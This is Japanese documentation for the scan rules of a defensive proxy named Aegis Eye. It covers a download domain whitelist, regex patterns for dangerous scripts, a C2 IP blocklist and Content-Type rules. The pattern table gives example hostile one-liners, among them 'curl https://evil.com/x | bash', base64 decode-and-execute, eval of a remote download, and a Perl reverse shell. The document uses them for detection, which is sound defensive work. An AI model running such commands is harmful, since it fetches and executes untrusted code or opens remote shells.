# Scan Rules

Aegis Eye (Proxy) が適用するスキャンルールの詳細。

## Rule Categories

### 1. Domain Whitelist

バイナリおよび実行可能ファイルのダウンロードを許可するドメインのリスト。ホワイトリストに含まれないドメインからのバイナリダウンロードはブロックされる。

**デフォルトホワイトリスト:**

| Domain | Purpose |
|---|---|
| `github.com` | ソースコード・リリース |
| `objects.githubusercontent.com` | GitHub リリースアセット |
| `registry.npmjs.org` | npm パッケージ |
| `pypi.org`, `files.pythonhosted.org` | Python パッケージ |
| `rubygems.org` | Ruby gems |
| `dl.google.com` | Google 公式ツール |
| `deb.nodesource.com` | Node.js パッケージ |
| `apt.llvm.org` | LLVM/Clang |
| `packages.microsoft.com` | Microsoft パッケージ |

**ファイル形式:** `domain_whitelist.txt`

```text
# Aegis Domain Whitelist
# One domain per line. Lines starting with # are comments.
github.com
objects.githubusercontent.com
registry.npmjs.org
pypi.org
files.pythonhosted.org
rubygems.org
dl.google.com
deb.nodesource.com
```

### 2. Dangerous Script Patterns

レスポンスボディ内で検出する危険なスクリプトパターン。マッチした場合はリクエストがブロックされる。

| Pattern | Description | Example |
|---|---|---|
| `curl\s+.*\|\s*(ba)?sh` | curl 出力のシェルへのパイプ | `curl https://evil.com/x \| bash` |
| `wget\s+.*\|\s*(ba)?sh` | wget 出力のシェルへのパイプ | `wget -O- url \| sh` |
| `curl.*-o\s*/tmp/.*&&.*sh\s+/tmp/` | ダウンロード + 実行 | `curl -o /tmp/x url && sh /tmp/x` |
| `base64\s+(-d\|--decode).*\|\s*(ba)?sh` | Base64 デコード + 実行 | `base64 -d <<< "..." \| sh` |
| `eval\s+"\$\(curl` | eval によるリモートコード実行 | `eval "$(curl -s url)"` |
| `python[23]?\s+-c\s+.*urllib` | Python ワンライナーでのダウンロード実行 | `python3 -c "import urllib..."` |
| `perl\s+-e\s+.*socket` | Perl によるリバースシェル | `perl -e 'use Socket;...'` |

**ルールファイル形式:** `rules.yml`

```yaml
dangerous_patterns:
  - name: curl_pipe_bash
    pattern: 'curl\s+.*\|\s*(ba)?sh'
    severity: critical
    description: "Piping curl output directly to shell"

  - name: wget_pipe_sh
    pattern: 'wget\s+.*\|\s*(ba)?sh'
    severity: critical
    description: "Piping wget output directly to shell"

  - name: base64_decode_exec
    pattern: 'base64\s+(-d|--decode).*\|\s*(ba)?sh'
    severity: critical
    description: "Decoding base64 and executing in shell"

  - name: eval_curl
    pattern: 'eval\s+"\$\(curl'
    severity: critical
    description: "Eval with remote code download"

  - name: download_and_exec
    pattern: 'curl.*-o\s+/tmp/.*&&.*sh\s+/tmp/'
    severity: high
    description: "Download to temp and execute"

  - name: python_urllib_exec
    pattern: 'python[23]?\s+-c\s+.*urllib'
    severity: medium
    description: "Python one-liner with urllib"

  - name: perl_reverse_shell
    pattern: 'perl\s+-e\s+.*socket'
    severity: high
    description: "Perl reverse shell pattern"
```

### 3. C2 IP Blocklist

既知の Command & Control サーバーの IP アドレス/レンジ。このリストに含まれる IP へのアウトバウンド接続はブロックされる。

**ファイル形式:** `c2_blocklist.txt`

```text
# Aegis C2 IP Blocklist
# CIDR notation. Lines starting with # are comments.
# Source: abuse.ch, emergingthreats.net, etc.
198.51.100.0/24
203.0.113.0/24
```

**推奨する脅威インテリジェンスソース:**

| Source | URL | Update Frequency |
|---|---|---|
| abuse.ch Feodo Tracker | `https://feodotracker.abuse.ch/downloads/ipblocklist.txt` | Daily |
| Emerging Threats | `https://rules.emergingthreats.net/` | Daily |
| AlienVault OTX | `https://otx.alienvault.com/` | Real-time |

### 4. Content-Type Rules

レスポンスの Content-Type に基づくルール。

| Content-Type | Action | Condition |
|---|---|---|
| `application/x-executable` | Scan required | 常にスキャナーに転送 |
| `application/x-sharedlib` | Scan required | 常にスキャナーに転送 |
| `application/x-mach-binary` | Scan required | 常にスキャナーに転送 |
| `application/octet-stream` | Scan required | 常にスキャナーに転送 |
| `application/gzip`, `application/zip`, `application/x-tar` | Scan required | 常にスキャナーに転送 |
| `text/x-shellscript` | Pattern check | 危険パターンを検査 |
| `text/x-python` | Pattern check | 危険パターンを検査 |
| `text/html`, `text/plain` | Pass-through | そのまま転送 |
| `application/json` | Pass-through | そのまま転送 |

## Custom Rules

### Adding a New Pattern Rule

`rules.yml` に新しいエントリを追加:

```yaml
dangerous_patterns:
  # ... existing rules ...
  - name: my_custom_rule
    pattern: 'your_regex_pattern_here'
    severity: high  # critical, high, medium, low
    description: "Description of what this rule detects"
```

### Adding a Whitelisted Domain

`domain_whitelist.txt` にドメインを追加:

```text
your-trusted-domain.com
```

### Updating C2 Blocklist

`c2_blocklist.txt` に IP/CIDR を追加:

```text
192.0.2.0/24
```

ルール変更後、Proxy を再起動して反映:

```bash
docker compose restart aegis-proxy
```
